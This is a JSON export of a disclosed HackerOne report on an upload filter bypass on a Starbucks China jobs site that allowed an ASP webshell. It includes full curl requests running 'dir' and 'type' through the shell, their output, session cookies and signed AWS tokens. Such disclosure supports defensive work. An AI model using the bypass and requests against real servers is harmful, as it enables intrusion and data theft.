{"id":506646,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDY2NDY=","url":"https://hackerone.com/reports/506646","title":"Webshell via File Upload on ecjobs.starbucks.com.cn","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-03-08T06:45:11.342Z","submitted_at":"2019-03-08T06:45:11.342Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"johnstone","url":"/johnstone","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/279/136/22310c009dc1c8739835187a9f220725a564f29b_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-13T00:38:41.593Z","bug_reporter_agreed_on_going_public_at":"2019-10-18T15:17:48.849Z","team_member_agreed_on_going_public_at":"2019-11-13T00:38:41.475Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** \nOS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network.\n\n**Description:** \nI found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.\n\n## Steps To Reproduce:\n\n  1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.\n  2. Use burp suite tools to interupt the avatar upload request.\n  3. Replace the filename type ```.jpg``` to ```asp ```which have a space character behind and modify the content\n\n  After that you have uploaded malicious files on the server and run any os command on server you wanted.\nDo some command like list all files on the server\n\n```\ncurl -i -s -k  -X $'GET' \\\n    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \\\n    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \\\n    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\\\TrustHX\\\\STBKSERM101\\\\www_app%20%2fd%2fs%2fb'\n```\n\n**The response content:**\n\n```\nHTTP/1.1 200 OK\nDate: Fri, 08 Mar 2019 02:56:19 GMT\nServer: wswaf/2.13.0-5.el6\nContent-Type: text/html\nCache-Control: private\nX-Powered-By: ASP.NET\nX-Via: 1.1 jszjsx51:1 (Cdn Cache Server V2.0), 1.1 PSjxncdx5rt58:6 (Cdn Cache Server V2.0)\nConnection: close\nContent-Length: 1814533\n\n\u003chtml\u003e\n\u003cbody\u003e\n\u003ch1\u003ePOC by hackerone_john stone\u003c/h1\u003e\n\u003ctextarea readonly cols=80 rows=25\u003e\nd:\\TrustHX\\STBKSERM101\\www_app\\bin\nd:\\TrustHX\\STBKSERM101\\www_app\\common\nd:\\TrustHX\\STBKSERM101\\www_app\\concurrent_test\nd:\\TrustHX\\STBKSERM101\\www_app\\Default.aspx\nd:\\TrustHX\\STBKSERM101\\www_app\\Global.asax\nd:\\TrustHX\\STBKSERM101\\www_app\\hximages_v6\n....................................\n\u003c/textarea\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n**Show the internal source code**\n```\ncurl -i -s -k  -X $'GET' \\\n    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \\\n    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \\\n    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\\\\TrustHX\\\\STBKSERM101\\\\www_app\\\\concurrent_test\\\\new_application_concurrent_test__svc.cs'\n```\nthe source code respones:\n```\nHTTP/1.1 200 OK\nDate: Fri, 08 Mar 2019 03:37:39 GMT\nServer: wswaf/2.13.0-5.el6\nContent-Type: text/html\nCache-Control: private\nX-Powered-By: ASP.NET\nX-Via: 1.1 jszjsx51:0 (Cdn Cache Server V2.0), 1.1 ydx154:3 (Cdn Cache Server V2.0)\nConnection: close\nContent-Length: 33316\n\n\u003chtml\u003e\n\u003cbody\u003e\n\u003ch1\u003ePOC by hackerone_john stone\u003c/h1\u003e\n\u003ctextarea readonly cols=80 rows=25\u003e\nï»¿using System;\nusing System.Collections.Generic;\nusing System.ComponentModel;\nusing System.Data;\nusing System.Drawing;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\nusing System;\nusing System.Collections.Specialized;\nusing System.Collections.Generic;\nusing System.Data;\nusing System.Configuration;\nusing System.Xml;\nusing System.Transactions;\nusing System.Text;\nusing System.Threading;\nusing System.Web;\n\nusing TrustHX.IHXEIMS6;\nusing hxsys = TrustHX.HXEIMS6;\nusing hxwww = TrustHX.HXWWW6;\nusing hxsm = TrustHX.HXSM6;\nusing hxmd = TrustHX.HXMD6;\n\n\nclass new_application_concurrent_test : IHXPageXmlService\n{\n    #region IHXPageXmlService æå\n    string IHXPageXmlService.Run(string strSystemCode, string strPageXmlServiceCode, string strPageXmlServiceContent, string strHXPageParamUUID, string strHXPageName)\n    {\n        try\n        {\n            switch (strPageXmlServiceCode)\n            {\n                case \"PREPARE_CONCURRENT_DATA\":return ConcurrentDataPrepare.ConcurrentDataPrepareProcess(strSystemCode, strPageXmlServiceContent);\n                case \"CONCURRENT_TEST\":return ConcurrentTest.ConcurrentTestProcess(strSystemCode, strPageXmlServiceContent);\n                default:\n                    string strErrorMessageText =\n....................................\n\u003c/textarea\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Recommendations for fix\n\n*Strictly limit file upload types\n*Only allow jpg/png/gif/jpeg file parsing on the uploaded fiels\n*More safe code design\n\nThks!Looking forward to your reply.\nWith kind regards\nJohn stone\n\n## Impact\n\ndisclosures  the internal source code data and user's information,broken ring server,etc.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e \u003cbr\u003e\nOS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e \u003cbr\u003e\nI found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eSign in the url(\u003ca title=\"https://ecjobs.starbucks.com.cn\" href=\"/redirect?url=https%3A%2F%2Fecjobs.starbucks.com.cn\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://ecjobs.starbucks.com.cn\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) and direct to the resume endpoint.\u003c/li\u003e\n\u003cli\u003eUse burp suite tools to interupt the avatar upload request.\u003c/li\u003e\n\u003cli\u003eReplace the filename type \u003ccode\u003e.jpg\u003c/code\u003e to \u003ccode\u003easp\u003c/code\u003ewhich have a space character behind and modify the content\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eAfter that you have uploaded malicious files on the server and run any os command on server you wanted.\u003cbr\u003e\nDo some command like list all files on the server\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -s -k  -X $\u0026#39;GET\u0026#39; \\\n    -H $\u0026#39;Host: ecjobs.starbucks.com.cn\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Connection: close\u0026#39; -H $\u0026#39;Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; \\\n    -b $\u0026#39;_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF\u0026#39; \\\n    $\u0026#39;https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\\\TrustHX\\\\STBKSERM101\\\\www_app%20%2fd%2fs%2fb\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eThe response content:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nDate: Fri, 08 Mar 2019 02:56:19 GMT\nServer: wswaf/2.13.0-5.el6\nContent-Type: text/html\nCache-Control: private\nX-Powered-By: ASP.NET\nX-Via: 1.1 jszjsx51:1 (Cdn Cache Server V2.0), 1.1 PSjxncdx5rt58:6 (Cdn Cache Server V2.0)\nConnection: close\nContent-Length: 1814533\n\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;h1\u0026gt;\u003c/span\u003ePOC by hackerone_john stone\u003cspan class=\"nt\"\u003e\u0026lt;/h1\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;textarea\u003c/span\u003e \u003cspan class=\"na\"\u003ereadonly\u003c/span\u003e \u003cspan class=\"na\"\u003ecols=\u003c/span\u003e\u003cspan class=\"s\"\u003e80\u003c/span\u003e \u003cspan class=\"na\"\u003erows=\u003c/span\u003e\u003cspan class=\"s\"\u003e25\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\nd:\\TrustHX\\STBKSERM101\\www_app\\bin\nd:\\TrustHX\\STBKSERM101\\www_app\\common\nd:\\TrustHX\\STBKSERM101\\www_app\\concurrent_test\nd:\\TrustHX\\STBKSERM101\\www_app\\Default.aspx\nd:\\TrustHX\\STBKSERM101\\www_app\\Global.asax\nd:\\TrustHX\\STBKSERM101\\www_app\\hximages_v6\n....................................\n\u003cspan class=\"nt\"\u003e\u0026lt;/textarea\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eShow the internal source code\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -s -k  -X $\u0026#39;GET\u0026#39; \\\n    -H $\u0026#39;Host: ecjobs.starbucks.com.cn\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Connection: close\u0026#39; -H $\u0026#39;Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; \\\n    -b $\u0026#39;_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF\u0026#39; \\\n    $\u0026#39;https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\\\\TrustHX\\\\STBKSERM101\\\\www_app\\\\concurrent_test\\\\new_application_concurrent_test__svc.cs\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ethe source code respones:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nDate: Fri, 08 Mar 2019 03:37:39 GMT\nServer: wswaf/2.13.0-5.el6\nContent-Type: text/html\nCache-Control: private\nX-Powered-By: ASP.NET\nX-Via: 1.1 jszjsx51:0 (Cdn Cache Server V2.0), 1.1 ydx154:3 (Cdn Cache Server V2.0)\nConnection: close\nContent-Length: 33316\n\n\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;h1\u0026gt;\u003c/span\u003ePOC by hackerone_john stone\u003cspan class=\"nt\"\u003e\u0026lt;/h1\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;textarea\u003c/span\u003e \u003cspan class=\"na\"\u003ereadonly\u003c/span\u003e \u003cspan class=\"na\"\u003ecols=\u003c/span\u003e\u003cspan class=\"s\"\u003e80\u003c/span\u003e \u003cspan class=\"na\"\u003erows=\u003c/span\u003e\u003cspan class=\"s\"\u003e25\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\nï»¿using System;\nusing System.Collections.Generic;\nusing System.ComponentModel;\nusing System.Data;\nusing System.Drawing;\nusing System.Linq;\nusing System.Text;\nusing System.Threading.Tasks;\nusing System;\nusing System.Collections.Specialized;\nusing System.Collections.Generic;\nusing System.Data;\nusing System.Configuration;\nusing System.Xml;\nusing System.Transactions;\nusing System.Text;\nusing System.Threading;\nusing System.Web;\n\nusing TrustHX.IHXEIMS6;\nusing hxsys = TrustHX.HXEIMS6;\nusing hxwww = TrustHX.HXWWW6;\nusing hxsm = TrustHX.HXSM6;\nusing hxmd = TrustHX.HXMD6;\n\n\nclass new_application_concurrent_test : IHXPageXmlService\n{\n    #region IHXPageXmlService æå\n    string IHXPageXmlService.Run(string strSystemCode, string strPageXmlServiceCode, string strPageXmlServiceContent, string strHXPageParamUUID, string strHXPageName)\n    {\n        try\n        {\n            switch (strPageXmlServiceCode)\n            {\n                case \u0026quot;PREPARE_CONCURRENT_DATA\u0026quot;:return ConcurrentDataPrepare.ConcurrentDataPrepareProcess(strSystemCode, strPageXmlServiceContent);\n                case \u0026quot;CONCURRENT_TEST\u0026quot;:return ConcurrentTest.ConcurrentTestProcess(strSystemCode, strPageXmlServiceContent);\n                default:\n                    string strErrorMessageText =\n....................................\n\u003cspan class=\"nt\"\u003e\u0026lt;/textarea\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"recommendations-for-fix\"\u003eRecommendations for fix\u003c/h2\u003e\n\n\u003cp\u003e*Strictly limit file upload types\u003cbr\u003e\n*Only allow jpg/png/gif/jpeg file parsing on the uploaded fiels\u003cbr\u003e\n*More safe code design\u003c/p\u003e\n\n\u003cp\u003eThks!Looking forward to your reply.\u003cbr\u003e\nWith kind regards\u003cbr\u003e\nJohn stone\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003edisclosures  the internal source code data and user\u0026#39;s information,broken ring server,etc.\u003c/p\u003e\n","bounty_amount":"4000.0","formatted_bounty":"$4,000","weakness":{"id":59,"name":"OS Command Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":437463,"file_name":"intenal_source_code.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/463/e2f5568a35827c4ca8dc556440e4a028078e6205/intenal_source_code.png?response-content-disposition=attachment%3B%20filename%3D%22intenal_source_code.png%22%3B%20filename%2A%3DUTF-8%27%27intenal_source_code.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRAVCXZTG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061119Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCDC1SbghdXLcy9ot06DANg74r5EiCC3XZ9CQGAdi%2BmbgIhALBQDzrYaszHyI6V41WOAEV%2Fa%2FxVgBgdKj18DrlZlW1RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgxgXaQ5tEaz15kO93YqkQPMn8lqJM5b%2F2UF4vgQzRZODqw%2FjPEjzpD61mE7LpyVCQKuiixef4EDRyTs5YaVZ%2BSeI6BYbm829Q00SoHZnAn9tGULy0VEKf9Lyq8uAs7eAOStN9gpb9p9GsQ2vxpwHzC%2F%2FjQuXDX8lTd6eIkj3L4VFhPdt4MGf%2FwzTbeirX69pmEGa7VpqUl%2BzQFSRmiyNkLz0iIRuGyUxcUtEFnAa4dcYImN8d5Xmzj3VKwszN5CZZekG0f6wVgiDQt2PU05Sm4mXV8F7Zsd2gCjxy0LByxZo8wVIQRR7XpJjeAXw7Y%2BrcntwG4VG16O2JBB13PV47avtAluDB7xEmxCn7fC%2B0gCkgtqX5FvemeTqZkzDj%2BNAE87%2BEwY1GKygDSgK%2BDrUlCwwYU%2FB1k9vGEpOa46oz6dP6MWDopeRWpW%2Fh2qwIShnMsIk%2BmfjH9n%2FnOGNwWwQp93Hlr6OPw%2F8tYLstkLZrNH3jzkkWMoWcsrv71HzpJiG6RZtm22uXPNaQTbmOYqMX%2BCryjdGcVIctKAsj5EliP0zjCb4Kr%2FBTrqAW3ufL%2FR%2FpkxPRO%2BUhyyvDPzgPmCSraR2g7lBy3KlX6LZ3JukP4SRvLInSvSu0w4T7VQh0EVNyALDb1flUgqzAKwYanyEiiHqHeCF6g4fX5%2Fuz8knjUQsnKmjOQfBtyaMe0qlW%2BHWCfwsR%2Fh2SNKi%2BVT7%2FCT2Ct%2Fia0RQuGDOtTr7KGlRg89Qz6oCZtR4isqOEM5yt6saYHHNTOAelO07weXRwFwKuKqmrZYMA5sa9p7XKqJAwmjMWMyFxAcEDHOluiNcMsa9JfilicFsycW11kxP5ZdIbUgRRdK1IdlTu3Ykx5X3L1RmsfWjw%3D%3D\u0026X-Amz-Signature=3f5b5cfad541e6fc84532977195baf6fa9bc12e33741aefbfe9c212de28f3e77","file_size":53981,"type":"image/png"},{"id":437464,"file_name":"OS_CMD.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/464/675d4af27f0bbb745c07062816fd112fa6430ceb/OS_CMD.png?response-content-disposition=attachment%3B%20filename%3D%22OS_CMD.png%22%3B%20filename%2A%3DUTF-8%27%27OS_CMD.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRAVCXZTG%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061119Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCDC1SbghdXLcy9ot06DANg74r5EiCC3XZ9CQGAdi%2BmbgIhALBQDzrYaszHyI6V41WOAEV%2Fa%2FxVgBgdKj18DrlZlW1RKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgxgXaQ5tEaz15kO93YqkQPMn8lqJM5b%2F2UF4vgQzRZODqw%2FjPEjzpD61mE7LpyVCQKuiixef4EDRyTs5YaVZ%2BSeI6BYbm829Q00SoHZnAn9tGULy0VEKf9Lyq8uAs7eAOStN9gpb9p9GsQ2vxpwHzC%2F%2FjQuXDX8lTd6eIkj3L4VFhPdt4MGf%2FwzTbeirX69pmEGa7VpqUl%2BzQFSRmiyNkLz0iIRuGyUxcUtEFnAa4dcYImN8d5Xmzj3VKwszN5CZZekG0f6wVgiDQt2PU05Sm4mXV8F7Zsd2gCjxy0LByxZo8wVIQRR7XpJjeAXw7Y%2BrcntwG4VG16O2JBB13PV47avtAluDB7xEmxCn7fC%2B0gCkgtqX5FvemeTqZkzDj%2BNAE87%2BEwY1GKygDSgK%2BDrUlCwwYU%2FB1k9vGEpOa46oz6dP6MWDopeRWpW%2Fh2qwIShnMsIk%2BmfjH9n%2FnOGNwWwQp93Hlr6OPw%2F8tYLstkLZrNH3jzkkWMoWcsrv71HzpJiG6RZtm22uXPNaQTbmOYqMX%2BCryjdGcVIctKAsj5EliP0zjCb4Kr%2FBTrqAW3ufL%2FR%2FpkxPRO%2BUhyyvDPzgPmCSraR2g7lBy3KlX6LZ3JukP4SRvLInSvSu0w4T7VQh0EVNyALDb1flUgqzAKwYanyEiiHqHeCF6g4fX5%2Fuz8knjUQsnKmjOQfBtyaMe0qlW%2BHWCfwsR%2Fh2SNKi%2BVT7%2FCT2Ct%2Fia0RQuGDOtTr7KGlRg89Qz6oCZtR4isqOEM5yt6saYHHNTOAelO07weXRwFwKuKqmrZYMA5sa9p7XKqJAwmjMWMyFxAcEDHOluiNcMsa9JfilicFsycW11kxP5ZdIbUgRRdK1IdlTu3Ykx5X3L1RmsfWjw%3D%3D\u0026X-Amz-Signature=c31861160d648a55bbf1123b7098b24f296f2af1dc08d5d26ac24a64d947098f","file_size":54437,"type":"image/png"}],"allow_singular_disclosure_at":"2019-11-17T15:17:48.913Z","allow_singular_disclosure_after":-35218410.53046379,"singular_disclosure_allowed":true,"vote_count":655,"voters":["nohats","lyinq","nakyamad","feedadad","tr3ss","superhero1","is-","theappanalyst","physuru","ak-ka","and 645 more..."],"severity":{"rating":"critical","score":10.0,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":13008,"asset_type":"OTHER","asset_identifier":"Other non domain specific items","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4283776,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this potential issue, \n\nYour report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.\n\nCheers,\n@still","markdown_message":"\u003cp\u003eThank you for reporting this potential issue, \u003c/p\u003e\n\n\u003cp\u003eYour report is currently being examined by the HackerOne triage team. You will receive further details, or questions, as soon as technically possible. Thanks for your patience.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n\u003ca href=\"/still\"\u003e@still\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T08:04:05.729Z","updated_at":"2019-03-08T08:04:05.729Z","actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4283795,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-08T08:12:00.273Z","updated_at":"2019-03-08T08:12:00.273Z","additional_data":{"old_severity":"Critical","new_severity":"Critical (10.0)","old_severity_id":312131,"new_severity_id":312147},"actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4283801,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @johnstone, thank you for your report.\n\nThis appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.\n\nThanks for your patience,\n@still ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/johnstone\"\u003e@johnstone\u003c/a\u003e, thank you for your report.\u003c/p\u003e\n\n\u003cp\u003eThis appears to be reproducible, but please note that your submission is not currently in scope, and the product team will rule whether this is an issue they intend to reward.\u003c/p\u003e\n\n\u003cp\u003eThanks for your patience,\u003cbr\u003e\n\u003ca href=\"/still\"\u003e@still\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-08T08:14:45.678Z","updated_at":"2019-03-08T08:14:45.678Z","actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4283805,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thks@still\nKind regards\njohn stone","markdown_message":"\u003cp\u003eThks@still\u003cbr\u003e\nKind regards\u003cbr\u003e\njohn 